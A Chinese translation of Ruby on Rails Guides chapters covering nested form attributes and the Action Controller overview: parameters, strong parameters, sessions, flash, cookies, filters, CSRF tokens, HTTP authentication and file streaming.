如果允许用户删除关联的对象，可以把 allow_destroy: true 选项传递给 accepts_nested_attributes_for 方法：
class Person < ActiveRecord::Base
  has_many :addresses
  accepts_nested_attributes_for :addresses, allow_destroy: true
end

如果属性组成的 Hash 中包含 _destroy 键，且其值为 1 或 true，就会删除对象。下面这个表单允许用户删除地址：
<%= form_for @person do |f| %>
  Addresses:
  <ul>
    <%= f.fields_for :addresses do |addresses_form| %>
      <li>
        <%= addresses_form.check_box :_destroy%>
        <%= addresses_form.label :kind %>
        <%= addresses_form.text_field :kind %>
        ...
      </li>
    <% end %>
  </ul>
<% end %>

别忘了修改控制器中的参数白名单，允许使用 _destroy：
def person_params
  params.require(:person).
    permit(:name, addresses_attributes: [:id, :kind, :street, :_destroy])
end

###  9.5 避免创建空记录

如果用户没有填写某些字段，最好将其忽略。此功能可以通过 accepts_nested_attributes_for 方法的 :reject_if 选项实现，其值为 Proc 对象。这个 Proc 对象会在通过表单提交的每一个属性 Hash 上调用。如果返回值为 false，Active Record 就不会为这个 Hash 构建关联对象。下面的示例代码只有当 kind 属性存在时才尝试构建地址对象：
class Person < ActiveRecord::Base
  has_many :addresses
  accepts_nested_attributes_for :addresses, reject_if: lambda {|attributes| attributes['kind'].blank?}
end

为了方便，可以把 reject_if 选项的值设为 :all_blank，此时创建的 Proc 会拒绝为 _destroy 之外其他属性都为空的 Hash 构建对象。

###  9.6 按需添加字段

我们往往不想事先显示多组字段，而是当用户点击“添加新地址”按钮后再显示。Rails 并没有内建这种功能。生成新的字段时要确保关联数组的键是唯一的，一般可在 JavaScript 中使用当前时间。

##  反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  Action Controller 简介

本文介绍控制器的工作原理，以及控制器在程序请求周期内扮演的角色。

读完本文，你将学到：

    请求如何进入控制器；
    如何限制传入控制器的参数；
    为什么以及如何把数据存储在会话或 cookie 中；
    处理请求时，如何使用过滤器执行代码；
    如何使用 Action Controller 內建的 HTTP 身份认证功能；
    如何把数据流直发送给用户的浏览器；
    如何过滤敏感信息，不写入程序的日志；
    如何处理请求过程中可能出现的异常；

Chapters

    控制器的作用
    控制器命名约定
    方法和动作
    参数
        Hash 和数组参数
        JSON 参数
        路由参数
        default_url_options
        健壮参数
    会话
        获取会话
        Flash 消息
    Cookies
    渲染 XML 和 JSON 数据
    过滤器
        后置过滤器和环绕过滤器
        过滤器的其他用法
    防止请求伪造
    request 和 response 对象
        request 对象
        response 对象
    HTTP 身份认证
        HTTP 基本身份认证
        HTTP 摘要身份认证
    数据流和文件下载
        发送文件
        使用 REST 的方式下载文件
        任意数据的实时流
    过滤日志
        过滤参数
        过滤转向
    异常处理
        默认的 500 和 404 模板
        rescue_from
    强制使用 HTTPS 协议

##  1 控制器的作用

Action Controller 是 MVC 中的 C（控制器）。路由决定使用哪个控制器处理请求后，控制器负责解析请求，生成对应的请求。Action Controller 会代为处理大多数底层工作，使用易懂的约定，让整个过程清晰明了。

在大多数按照 REST 规范开发的程序中，控制器会接收请求（开发者不可见），从模型中获取数据，或把数据写入模型，再通过视图生成 HTML。如果控制器需要做其他操作，也没问题，以上只不过是控制器的主要作用。

因此，控制器可以视作模型和视图的中间人，让模型中的数据可以在视图中使用，把数据显示给用户，再把用户提交的数据保存或更新到模型中。

路由的处理细节请查阅 Rails Routing From the Outside In。

##  2 控制器命名约定

Rails 控制器的命名习惯是，最后一个单词使用复数形式，但也是有例外，比如 ApplicationController。例如：用 ClientsController，而不是 ClientController；用 SiteAdminsController，而不是 SiteAdminController 或 SitesAdminsController。

遵守这一约定便可享用默认的路由生成器（例如 resources 等），无需再指定 :path 或 :controller，URL 和路径的帮助方法也能保持一致性。详情参阅 Layouts & Rendering Guide。

控制器的命名习惯和模型不同，模型的名字习惯使用单数形式。

##  3 方法和动作

控制器是一个类，继承自 ApplicationController，和其他类一样，定义了很多方法。程序接到请求时，路由决定运行哪个控制器和哪个动作，然后创建该控制器的实例，运行和动作同名的方法。
class ClientsController < ApplicationController
  def new
  end
end

例如，用户访问 /clients/new 新建客户，Rails 会创建一个 ClientsController 实例，运行 new 方法。注意，在上面这段代码中，即使 new 方法是空的也没关系，因为默认会渲染 new.html.erb 视图，除非指定执行其他操作。在 new 方法中，声明可在视图中使用的 @client 实例变量，创建一个新的 Client 实例：
def new
  @client = Client.new
end

详情参阅 Layouts & Rendering Guide。

ApplicationController 继承自 ActionController::Base。ActionController::Base 定义了很多实用方法。本文会介绍部分方法，如果想知道定义了哪些方法，可查阅 API 文档或源码。

只有公开方法才被视为动作。所以最好减少对外可见的方法数量，例如辅助方法和过滤器方法。

##  4 参数

### 两种参数
在控制器的动作中，往往需要获取用户发送的数据，或其他参数。在网页程序中参数分为两类。第一类随 URL 发送，叫做“请求参数”，即 URL 中 ? 符号后面的部分。第二类经常成为“POST 数据”，一般来自用户填写的表单。之所以叫做“POST 数据”是因为，只能随 HTTP POST 请求发送。Rails 不区分这两种参数，在控制器中都可通过 params Hash 获取：
class ClientsController < ApplicationController
  # This action uses query string parameters because it gets run
  # by an HTTP GET request, but this does not make any difference
  # to the way in which the parameters are accessed. The URL for
  # this action would look like this in order to list activated
  # clients: /clients?status=activated
  def index
    if params[:status] == "activated"
      @clients = Client.activated
    else
      @clients = Client.inactivated
    end
  end
 
  # This action uses POST parameters. They are most likely coming
  # from an HTML form which the user has submitted. The URL for
  # this RESTful request will be "/clients", and the data will be
  # sent as part of the request body.
  def create
    @client = Client.new(params[:client])
    if @client.save
      redirect_to @client
    else
      # This line overrides the default rendering behavior, which
      # would have been to render the "create" view.
      render "new"
    end
  end
end

###  4.1 Hash 和数组参数

params Hash 不局限于只能使用一维键值对，其中可以包含数组和嵌套的 Hash。要发送数组，需要在键名后加上一对空方括号（[]）：
GET /clients?ids[]=1&ids[]=2&ids[]=3

“[”和“]”这两个符号不允许出现在 URL 中，所以上面的地址会被编码成 /clients?ids%5b%5d=1&ids%5b%5d=2&ids%5b%5d=3。大多数情况下，无需你费心，浏览器会为你代劳编码，接收到这样的请求后，Rails 也会自动解码。如果你要手动向服务器发送这样的请求，就要留点心了。

此时，params[:ids] 的值是 ["1", "2", "3"]。注意，参数的值始终是字符串，Rails 不会尝试转换类型。

默认情况下，基于安全考虑，参数中的 []、[nil] 和 [nil, nil, ...] 会替换成 nil。详情参阅安全指南。

要发送嵌套的 Hash 参数，需要在方括号内指定键名：
<form accept-charset="UTF-8" action="/clients" method="post">
  <input type="text" name="client[name]" value="Acme" />
  <input type="text" name="client[phone]" value="12345" />
  <input type="text" name="client[address][postcode]" value="12345" />
  <input type="text" name="client[address][city]" value="Carrot City" />
</form>

提交这个表单后，params[:client] 的值是 { "name" => "Acme", "phone" => "12345", "address" => { "postcode" => "12345", "city" => "Carrot City" } }。注意 params[:client][:address] 是个嵌套 Hash。

注意，params Hash 其实是 ActiveSupport::HashWithIndifferentAccess 的实例，虽和普通的 Hash 一样，但键名使用 Symbol 和字符串的效果一样。

###  4.2 JSON 参数

开发网页服务程序时，你会发现，接收 JSON 格式的参数更容易处理。如果请求的 Content-Type 报头是 application/json，Rails 会自动将其转换成 params Hash，按照常规的方法使用：

例如，如果发送如下的 JSON 格式内容：
{ "company": { "name": "acme", "address": "123 Carrot Street" } }

得到的是 params[:company] 就是 { "name" => "acme", "address" => "123 Carrot Street" }。

如果在初始化脚本中开启了 config.wrap_parameters 选项，或者在控制器中调用了 wrap_parameters 方法，可以放心的省去 JSON 格式参数中的根键。Rails 会以控制器名新建一个键，复制参数，将其存入这个键名下。因此，上面的参数可以写成：
{ "name": "acme", "address": "123 Carrot Street" }

假设数据传送给 CompaniesController，那么参数会存入 :company 键名下：
{ name: "acme", address: "123 Carrot Street", company: { name: "acme", address: "123 Carrot Street" } }

如果想修改默认使用的键名，或者把其他参数存入其中，请参阅 API 文档。

解析 XML 格式参数的功能现已抽出，制成了 gem，名为 actionpack-xml_parser。

###  4.3 路由参数

params Hash 总有 :controller 和 :action 两个键，但获取这两个值应该使用 controller_name 和 action_name 方法。路由中定义的参数，例如 :id，也可通过 params Hash 获取。例如，假设有个客户列表，可以列出激活和禁用的客户。我们可以定义一个路由，捕获下面这个 URL 中的 :status 参数：
get '/clients/:status' => 'clients#index', foo: 'bar'

在这个例子中，用户访问 /clients/active 时，params[:status] 的值是 "active"。同时，params[:foo] 的值也会被设为 "bar"，就像通过请求参数传入的一样。params[:action] 也是一样，其值为 "index"。

###  4.4 default_url_options

在控制器中定义名为 default_url_options 的方法，可以设置所生成 URL 中都包含的参数。这个方法必须返回一个 Hash，其值为所需的参数值，而且键必须使用 Symbol：
class ApplicationController < ActionController::Base
  def default_url_options
    { locale: I18n.locale }
  end
end

这个方法定义的只是预设参数，可以被 url_for 方法的参数覆盖。

如果像上面的代码一样，在 ApplicationController 中定义 default_url_options，则会用于所有生成的 URL。default_url_options 也可以在具体的控制器中定义，只影响和该控制器有关的 URL。

###  4.5 健壮参数

#### 赋值名单和强制参数
加入健壮参数功能后，Action Controller 的参数禁止在 Avtive Model 中批量赋值，除非参数在白名单中。也就是说，你要明确选择那些属性可以批量更新，避免意外把不该暴露的属性暴露了。

而且，还可以标记哪些参数是必须传入的，如果没有收到，会交由 raise/rescue 处理，返回“400 Bad Request”。
class PeopleController < ActionController::Base
  # This will raise an ActiveModel::ForbiddenAttributes exception
  # because it's using mass assignment without an explicit permit
  # step.
  def create
    Person.create(params[:person])
  end
 
  # This will pass with flying colors as long as there's a person key
  # in the parameters, otherwise it'll raise a
  # ActionController::ParameterMissing exception, which will get
  # caught by ActionController::Base and turned into that 400 Bad
  # Request reply.
  def update
    person = current_account.people.find(params[:id])
    person.update!(person_params)
    redirect_to person
  end
 
  private
    # Using a private method to encapsulate the permissible parameters
    # is just a good pattern since you'll be able to reuse the same
    # permit list between create and update. Also, you can specialize
    # this method with per-user checking of permissible attributes.
    def person_params
      params.require(:person).permit(:name, :age)
    end
end

####  4.5.1 允许使用的标量值

假如允许传入 :id：
params.permit(:id)

若 params 中有 :id，且 :id 是标量值，就可以通过白名单检查，否则 :id 会被过滤掉。因此不能传入数组、Hash 或其他对象。

允许使用的标量类型有：String、Symbol、NilClass、Numeric、TrueClass、FalseClass、Date、Time、DateTime、StringIO、IO、ActionDispatch::Http::UploadedFile 和 Rack::Test::UploadedFile。

要想指定 params 中的值必须为数组，可以把键对应的值设为空数组：
params.permit(id: [])

要想允许传入整个参数 Hash，可以使用 permit! 方法：
params.require(:log_entry).permit!

此时，允许传入整个 :log_entry Hash 及嵌套 Hash。使用 permit! 时要特别注意，因为这么做模型中所有当前属性及后续添加的属性都允许进行批量赋值。
####  4.5.2 嵌套参数

也可以允许传入嵌套参数，例如：
params.permit(:name, { emails: [] },
              friends: [ :name,
                         { family: [ :name ], hobbies: [] }])

此时，允许传入 name，emails 和 friends 属性。其中，emails 必须是数组；friends 必须是一个由资源组成的数组：应该有个 name 属性，还要有 hobbies 属性，其值是由标量组成的数组，以及一个 family 属性，其值只能包含 name 属性（任何允许使用的标量值）。

####  4.5.3 更多例子

你可能还想在 new 动作中限制允许传入的属性。不过此时无法再根键上调用 require 方法，因为此时根键还不存在：
# using `fetch` you can supply a default and use
# the Strong Parameters API from there.
params.fetch(:blog, {}).permit(:title, :author)

使用 accepts_nested_attributes_for 方法可以更新或销毁响应的记录。这个方法基于 id 和 _destroy 参数：
# permit :id and :_destroy
params.require(:author).permit(:name, books_attributes: [:title, :id, :_destroy])

如果 Hash 的键是数字，处理方式有所不同，此时可以把属性作为 Hash 的直接子 Hash。accepts_nested_attributes_for 和 has_many 关联同时使用时会得到这种参数：
# To whitelist the following data:
# {"book" => {"title" => "Some Book",
#             "chapters_attributes" => { "1" => {"title" => "First Chapter"},
#                                        "2" => {"title" => "Second Chapter"}}}}
 
params.require(:book).permit(:title, chapters_attributes: [:title])
####  4.5.4 不用健壮参数

健壮参数的目的是为了解决常见问题，不是万用良药。不过，可以很方便的和自己的代码结合，解决复杂需求。

假设有个参数包含产品的名字和一个由任意数据组成的产品附加信息 Hash，希望过滤产品名和整个附加数据 Hash。健壮参数不能过滤由任意键值组成的嵌套 Hash，不过可以使用嵌套 Hash 的键定义过滤规则：
def product_params
  params.require(:product).permit(:name, data: params[:product][:data].try(:keys))
end


##  5 会话

程序中的每个用户都有一个会话（session），可以存储少量数据，在多次请求中永久存储。会话只能在控制器和视图中使用，可以通过以下几种存储机制实现：

    ActionDispatch::Session::CookieStore：所有数据都存储在客户端
    ActionDispatch::Session::CacheStore：数据存储在 Rails 缓存里
    ActionDispatch::Session::ActiveRecordStore：使用 Active Record 把数据存储在数据库中（需要使用 activerecord-session_store gem）
    ActionDispatch::Session::MemCacheStore：数据存储在 Memcached 集群中（这是以前的实现方式，现在请改用 CacheStore）

所有存储机制都会用到一个 cookie，存储每个会话的 ID（必须使用 cookie，因为 Rails 不允许在 URL 中传递会话 ID，这么做不安全）。

大多数存储机制都会使用这个 ID 在服务商查询会话数据，例如在数据库中查询。不过有个例外，即默认也是推荐使用的存储方式 CookieStore。CookieStore 把所有会话数据都存储在 cookie 中（如果需要，还是可以使用 ID）。CookieStore 的优点是轻量，而且在新程序中使用会话也不用额外的设置。cookie 中存储的数据会使用密令签名，以防篡改。cookie 会被加密，任何有权访问的人都无法读取其内容。（如果修改了 cookie，Rails 会拒绝使用。）

CookieStore 可以存储大约 4KB 数据，比其他几种存储机制都少很多，但一般也足够用了。不过使用哪种存储机制，都不建议在会话中存储大量数据。应该特别避免在会话中存储复杂的对象（Ruby 基本对象之外的一切对象，最常见的是模型实例），服务器可能无法在多次请求中重组数据，最终导致错误。

如果会话中没有存储重要的数据，或者不需要持久存储（例如使用 Falsh 存储消息），可以考虑使用 ActionDispatch::Session::CacheStore。这种存储机制使用程序所配置的缓存方式。CacheStore 的优点是，可以直接使用现有的缓存方式存储会话，不用额外的设置。不过缺点也很明显，会话存在时间很多，随时可能消失。

关于会话存储的更多内容请参阅安全指南

如果想使用其他的会话存储机制，可以在 config/initializers/session_store.rb 文件中设置：
# Use the database for sessions instead of the cookie-based default,
# which shouldn't be used to store highly confidential information
# (create the session table with "rails g active_record:session_migration")
# YourApp::Application.config.session_store :active_record_store

签署会话数据时，Rails 会用到会话的键（cookie 的名字），这个值可以在 config/initializers/session_store.rb 中修改：
# Be sure to restart your server when you modify this file.
YourApp::Application.config.session_store :cookie_store, key: '_your_app_session'

还可以传入 :domain 键，指定可使用此 cookie 的域名：
# Be sure to restart your server when you modify this file.
YourApp::Application.config.session_store :cookie_store, key: '_your_app_session', domain: ".example.com"

Rails 为 CookieStore 提供了一个密令，用来签署会话数据。这个密令可以在 config/secrets.yml 文件中修改：
# Be sure to restart your server when you modify this file.
 
# Your secret key is used for verifying the integrity of signed cookies.
# If you change this key, all old signed cookies will become invalid!
 
# Make sure the secret is at least 30 characters and all random,
# no regular words or you'll be exposed to dictionary attacks.
# You can use `rake secret` to generate a secure secret key.
 
# Make sure the secrets in this file are kept private
# if you're sharing your code publicly.
 
development:
  secret_key_base: a75d...
 
test:
  secret_key_base: 492f...
 
# Do not keep production secrets in the repository,
# instead read values from the environment.
production:
  secret_key_base: <%= ENV["SECRET_KEY_BASE"] %>

使用 CookieStore 时，如果修改了密令，之前所有的会话都会失效。

###  5.1 获取会话

在控制器中，可以使用实例方法 session 获取会话。

会话是惰性加载的，如果不在动作中获取，不会自动加载。因此无需禁用会话，不获取即可。

会话中的数据以键值对的形式存储，类似 Hash：
class ApplicationController < ActionController::Base
 
  private
 
  # Finds the User with the ID stored in the session with the key
  # :current_user_id This is a common way to handle user login in
  # a Rails application; logging in sets the session value and
  # logging out removes it.
  def current_user
    @_current_user ||= session[:current_user_id] &&
      User.find_by(id: session[:current_user_id])
  end
end

要想把数据存入会话，像 Hash 一样，给键赋值即可：
class LoginsController < ApplicationController
  # "Create" a login, aka "log the user in"
  def create
    if user = User.authenticate(params[:username], params[:password])
      # Save the user ID in the session so it can be used in
      # subsequent requests
      session[:current_user_id] = user.id
      redirect_to root_url
    end
  end
end

要从会话中删除数据，把键的值设为 nil 即可：
class LoginsController < ApplicationController
  # "Delete" a login, aka "log the user out"
  def destroy
    # Remove the user id from the session
    @_current_user = session[:current_user_id] = nil
    redirect_to root_url
  end
end

要重设整个会话，请使用 reset_session 方法。
###  5.2 Flash 消息

Flash 是会话的一个特殊部分，每次请求都会清空。也就是说，其中存储的数据只能在下次请求时使用，可用来传递错误消息等。

Flash 消息的获取方式和会话差不多，类似 Hash。Flash 消息是 FlashHash 实例。

下面以退出登录为例。控制器可以发送一个消息，在下一次请求时显示：
class LoginsController < ApplicationController
  def destroy
    session[:current_user_id] = nil
    flash[:notice] = "You have successfully logged out."
    redirect_to root_url
  end
end

注意，Flash 消息还可以直接在转向中设置。可以指定 :notice、:alert 或者常规的 :flash：
redirect_to root_url, notice: "You have successfully logged out."
redirect_to root_url, alert: "You're stuck here!"
redirect_to root_url, flash: { referral_code: 1234 }

上例中，destroy 动作转向程序的 root_url，然后显示 Flash 消息。注意，只有下一个动作才能处理前一个动作中设置的 Flash 消息。一般都会在程序的布局中加入显示警告或提醒 Flash 消息的代码：

{:lang="erb"} ``` <!--
<% flash.each do |name, msg| -%> <%= content_tag :div, msg, class: name %> <% end -%>
<!-- more content -->

```

如此一來，如果动作中设置了警告或提醒消息，就会出现在布局中。

Flash 不局限于警告和提醒，可以设置任何可在会话中存储的内容：

{:lang="erb"} <% if flash[:just_signed_up] %> <p class="welcome">Welcome to our site!</p> <% end %>

如果希望 Flash 消息保留到其他请求，可以使用 keep 方法：
class MainController < ApplicationController
  # Let's say this action corresponds to root_url, but you want
  # all requests here to be redirected to UsersController#index.
  # If an action sets the flash and redirects here, the values
  # would normally be lost when another redirect happens, but you
  # can use 'keep' to make it persist for another request.
  def index
    # Will persist all flash values.
    flash.keep
 
    # You can also use a key to keep only some kind of value.
    # flash.keep(:notice)
    redirect_to users_url
  end
end

####  5.2.1 flash.now

默认情况下，Flash 中的内容只在下一次请求中可用，但有时希望在同一个请求中使用。例如，create 动作没有成功保存资源时，会直接渲染 new 模板，这并不是一个新请求，但却希望希望显示一个 Flash 消息。针对这种情况，可以使用 flash.now，用法和 flash 一样：
class ClientsController < ApplicationController
  def create
    @client = Client.new(params[:client])
    if @client.save
      # ...
    else
      flash.now[:error] = "Could not save client"
      render action: "new"
    end
  end
end


##  6 Cookies

程序可以在客户端存储少量数据（称为 cookie），在多次请求中使用，甚至可以用作会话。在 Rails 中可以使用 cookies 方法轻松获取 cookies，用法和 session 差不多，就像一个 Hash：
class CommentsController < ApplicationController
  def new
    # Auto-fill the commenter's name if it has been stored in a cookie
    @comment = Comment.new(author: cookies[:commenter_name])
  end
 
  def create
    @comment = Comment.new(params[:comment])
    if @comment.save
      flash[:notice] = "Thanks for your comment!"
      if params[:remember_name]
        # Remember the commenter's name.
        cookies[:commenter_name] = @comment.author
      else
        # Delete cookie for the commenter's name cookie, if any.
        cookies.delete(:commenter_name)
      end
      redirect_to @comment.article
    else
      render action: "new"
    end
  end
end

注意，删除会话中的数据是把键的值设为 nil，但要删除 cookie 中的值，要使用 cookies.delete(:key) 方法。

Rails 还提供了签名 cookie 和加密 cookie，用来存储敏感数据。签名 cookie 会在 cookie 的值后面加上一个签名，确保值没被修改。加密 cookie 除了会签名之外，还会加密，让终端用户无法读取。详细信息请参阅 API 文档。

这两种特殊的 cookie 会序列化签名后的值，生成字符串，读取时再反序列化成 Ruby 对象。

序列化所用的方式可以指定：
Rails.application.config.action_dispatch.cookies_serializer = :json

新程序默认使用的序列化方法是 :json。为了兼容以前程序中的 cookie，如果没设定 cookies_serializer，就会使用 :marshal。

这个选项还可以设为 :hybrid，读取时，Rails 会自动返序列化使用 Marshal 序列化的 cookie，写入时使用 JSON 格式。把现有程序迁移到使用 :json 序列化方式时，这么设定非常方便。

序列化方式还可以使用其他方式，只要定义了 load 和 dump 方法即可：
Rails.application.config.action_dispatch.cookies_serializer = MyCustomSerializer

##  7 渲染 XML 和 JSON 数据

在 ActionController 中渲染 XML 和 JSON 数据非常简单。使用脚手架生成的控制器如下所示：
class UsersController < ApplicationController
  def index
    @users = User.all
    respond_to do |format|
      format.html # index.html.erb
      format.xml  { render xml: @users}
      format.json { render json: @users}
    end
  end
end

你可能注意到了，在这段代码中，我们使用的是 render xml: @users 而不是 render xml: @users.to_xml。如果不是字符串对象，Rails 会自动调用 to_xml 方法。

##  8 过滤器

过滤器（filter）是一些方法，在控制器动作运行之前、之后，或者前后运行。

过滤器会继承，如果在 ApplicationController 中定义了过滤器，那么程序的每个控制器都可使用。

前置过滤器有可能会终止请求循环。前置过滤器经常用来确保动作运行之前用户已经登录。这种过滤器的定义如下：
class ApplicationController < ActionController::Base
  before_action :require_login
 
  private
 
  def require_login
    unless logged_in?
      flash[:error] = "You must be logged in to access this section"
      redirect_to new_login_url # halts request cycle
    end
  end
end

如果用户没有登录，这个方法会在 Flash 中存储一个错误消息，然后转向登录表单页面。如果前置过滤器渲染了页面或者做了转向，动作就不会运行。如果动作上还有后置过滤器，也不会运行。

在上面的例子中，过滤器在 ApplicationController 中定义，所以程序中的所有控制器都会继承。程序中的所有页面都要求用户登录后才能访问。很显然（这样用户根本无法登录），并不是所有控制器或动作都要做这种限制。如果想跳过某个动作，可以使用 skip_before_action：
class LoginsController < ApplicationController
  skip_before_action :require_login, only: [:new, :create]
end

此时，LoginsController 的 new 动作和 create 动作就不需要用户先登录。:only 选项的意思是只跳过这些动作。还有个 :except 选项，用法类似。定义过滤器时也可使用这些选项，指定只在选中的动作上运行。
###  8.1 后置过滤器和环绕过滤器

除了前置过滤器之外，还可以在动作运行之后，或者在动作运行前后执行过滤器。

后置过滤器类似于前置过滤器，不过因为动作已经运行了，所以可以获取即将发送给客户端的响应数据。显然，后置过滤器无法阻止运行动作。

环绕过滤器会把动作拉入（yield）过滤器中，工作方式类似 Rack 中间件。

例如，网站的改动需要经过管理员预览，然后批准。可以把这些操作定义在一个事务中：
class ChangesController < ApplicationController
  around_action :wrap_in_transaction, only: :show
 
  private
 
  def wrap_in_transaction
    ActiveRecord::Base.transaction do
      begin
        yield
      ensure
        raise ActiveRecord::Rollback
      end
    end
  end
end

注意，环绕过滤器还包含了渲染操作。在上面的例子中，视图本身是从数据库中读取出来的（例如，通过作用域（scope）），读取视图的操作在事务中完成，然后提供预览数据。

也可以不拉入动作，自己生成响应，不过这种情况不会运行动作。

###  8.2 过滤器的其他用法

一般情况下，过滤器的使用方法是定义私有方法，然后调用相应的 *_action 方法添加过滤器。不过过滤器还有其他两种用法。

第一种，直接在 *_action 方法中使用代码块。代码块接收控制器作为参数。使用这种方法，前面的 require_login 过滤器可以改写成：
class ApplicationController < ActionController::Base
  before_action do |controller|
    unless controller.send(:logged_in?)
      flash[:error] = "You must be logged in to access this section"
      redirect_to new_login_url
    end
  end
end

注意，此时在过滤器中使用的是 send 方法，因为 logged_in? 是私有方法，而且过滤器和控制器不在同一作用域内。定义 require_login 过滤器不推荐使用这种方法，但比较简单的过滤器可以这么用。

第二种，在类（其实任何能响应正确方法的对象都可以）中定义过滤器。这种方法用来实现复杂的过滤器，使用前面的两种方法无法保证代码可读性和重用性。例如，可以在一个类中定义前面的 require_login 过滤器：
class ApplicationController < ActionController::Base
  before_action LoginFilter
end
 
class LoginFilter
  def self.before(controller)
    unless controller.send(:logged_in?)
      controller.flash[:error] = "You must be logged in to access this section"
      controller.redirect_to controller.new_login_url
    end
  end
end

这种方法也不是定义 require_login 过滤器的理想方式，因为和控制器不在同一作用域，要把控制器作为参数传入。定义过滤器的类，必须有一个和过滤器种类同名的方法。对于 before_action 过滤器，类中必须定义 before 方法。其他类型的过滤器以此类推。around 方法必须调用 yield 方法执行动作。

##  9 防止请求伪造

跨站请求伪造（CSRF）是一种工具方式，A 网站的用户伪装成 B 网站的用户发送请求，在 B 站中添加、修改或删除数据，而 B 站的用户绝然不知。

防止这种攻击的第一步是，确保所有析构动作（create，update 和 destroy）只能通过 GET 之外的请求方法访问。如果遵从 REST 架构，已经完成了这一步。不过，恶意网站还是可以很轻易地发起非 GET 请求，这时就要用到其他防止跨站攻击的方法了。

我们添加一个只有自己的服务器才知道的难以猜测的令牌。如果请求中没有该令牌，就会禁止访问。

如果使用下面的代码生成一个表单：

{:lang="erb"} <%= form_for @user do |f| %> <%= f.text_field :username %> <%= f.text_field :password %> <% end %>

会看到 Rails 自动添加了一个隐藏字段：
<form accept-charset="UTF-8" action="/users/1" method="post">
<input type="hidden"
       value="67250ab105eb5ad10851c00a5621854a23af5489"
       name="authenticity_token"/>
<!-- username & password fields -->
</form>

所有使用表单帮助方法生成的表单，都有会添加这个令牌。如果想自己编写表单，或者基于其他原因添加令牌，可以使用 form_authenticity_token 方法。

form_authenticity_token 会生成一个有效的令牌。在 Rails 没有自动添加令牌的地方（例如 Ajax）可以使用这个方法。

安全指南一文更深入的介绍了请求伪造防范措施，还有一些开发网页程序需要知道的安全隐患。

##  10 request 和 response 对象

在每个控制器中都有两个存取器方法，分别用来获取当前请求循环的请求对象和响应对象。request 方法的返回值是 AbstractRequest 对象的实例；response 方法的返回值是一个响应对象，表示回送客户端的数据。

###  10.1 request 对象

request 对象中有很多发自客户端请求的信息。可用方法的完整列表参阅 API 文档。其中部分方法说明如下：
request 对象的属性 	作用
host 	请求发往的主机名
domain(n=2) 	主机名的前 n 个片段，从顶级域名的右侧算起
format 	客户端发起请求时使用的内容类型
method 	请求使用的 HTTP 方法
get?, post?, patch?, put?, delete?, head? 	如果 HTTP 方法是 GET/POST/PATCH/PUT/DELETE/HEAD，返回 true
headers 	返回一个 Hash，包含请求的报头
port 	请求发往的端口，整数类型
protocol 	返回所用的协议外加 "://"，例如 "http://"
query_string 	URL 中包含的请求参数，? 后面的字符串
remote_ip 	客户端的 IP 地址
url 	请求发往的完整 URL

####  10.1.1 path_parameters，query_parameters 和 request_parameters

不过请求中的参数随 URL 而来，而是通过表单提交，Rails 都会把这些参数存入 params Hash 中。request 对象中有三个存取器，用来获取各种类型的参数。query_parameters Hash 中的参数来自 URL；request_parameters Hash 中的参数来自提交的表单；path_parameters Hash 中的参数来自路由，传入相应的控制器和动作。
###  10.2 response 对象

一般情况下不会直接使用 response 对象。response 对象在动作中渲染，把数据回送给客户端。不过有时可能需要直接获取响应，比如在后置过滤器中。response 对象上的方法很多都可以用来赋值。
response 对象的数学 	作用
body 	回送客户端的数据，字符串格式。大多数情况下是 HTML
status 	响应的 HTTP 状态码，例如，请求成功时是 200，文件未找到时是 404
location 	转向地址（如果转向的话）
content_type 	响应的内容类型
charset 	响应使用的字符集。默认是 "utf-8"
headers 	响应报头

####  10.2.1 设置自定义报头

如果想设置自定义报头，可以使用 response.headers 方法。报头是一个 Hash，键为报头名，值为报头的值。Rails 会自动设置一些报头，如果想添加或者修改报头，赋值给 response.headers 即可，例如：
response.headers["Content-Type"] = "application/pdf"

注意，上面这段代码直接使用 content_type= 方法更直接。
##  11 HTTP 身份认证

Rails 内建了两种 HTTP 身份认证方式：

    基本认证
    摘要认证

###  11.1 HTTP 基本身份认证

大多数浏览器和 HTTP 客户端都支持 HTTP 基本身份认证。例如，在浏览器中如果要访问只有管理员才能查看的页面，就出回显一个对话框，要求输入用户名和密码。使用内建的身份认证非常简单，只要使用一个方法，即 http_basic_authenticate_with。
class AdminsController < ApplicationController
  http_basic_authenticate_with name: "humbaba", password: "5baa61e4"
end

添加 http_basic_authenticate_with 方法后，可以创建具有命名空间的控制器，继承自 AdminsController，http_basic_authenticate_with 方法会在这些控制器的所有动作运行之前执行，启用 HTTP 基本身份认证。
###  11.2 HTTP 摘要身份认证

HTTP 摘要身份认证比基本认证高级，因为客户端不会在网络中发送明文密码（不过在 HTTPS 中基本认证是安全的）。在 Rails 中使用摘要认证非常简单，只需使用一个方法，即 authenticate_or_request_with_http_digest。
class AdminsController < ApplicationController
  USERS = { "lifo" => "world" }
 
  before_action :authenticate
 
  private
 
    def authenticate
      authenticate_or_request_with_http_digest do |username|
        USERS[username]
      end
    end
end

如上面的代码所示，authenticate_or_request_with_http_digest 方法的块只接受一个参数，用户名，返回值是密码。如果 authenticate_or_request_with_http_digest 返回 false 或 nil，表明认证失败。

##  12 数据流和文件下载

有时不想渲染 HTML 页面，而要把文件发送给用户。在所有的控制器中都可以使用 send_data 和 send_file 方法。这两个方法都会以数据流的方式发送数据。send_file 方法很方便，只要提供硬盘中文件的名字，就会用数据流发送文件内容。

要想把数据以数据流的形式发送给客户端，可以使用 send_data 方法：
require "prawn"
class ClientsController < ApplicationController
  # Generates a PDF document with information on the client and
  # returns it. The user will get the PDF as a file download.
  def download_pdf
    client = Client.find(params[:id])
    send_data generate_pdf(client),
              filename: "#{client.name}.pdf",
              type: "application/pdf"
  end
 
  private
 
    def generate_pdf(client)
      Prawn::Document.new do
        text client.name, align: :center
        text "Address: #{client.address}"
        text "Email: #{client.email}"
      end.render
    end
end

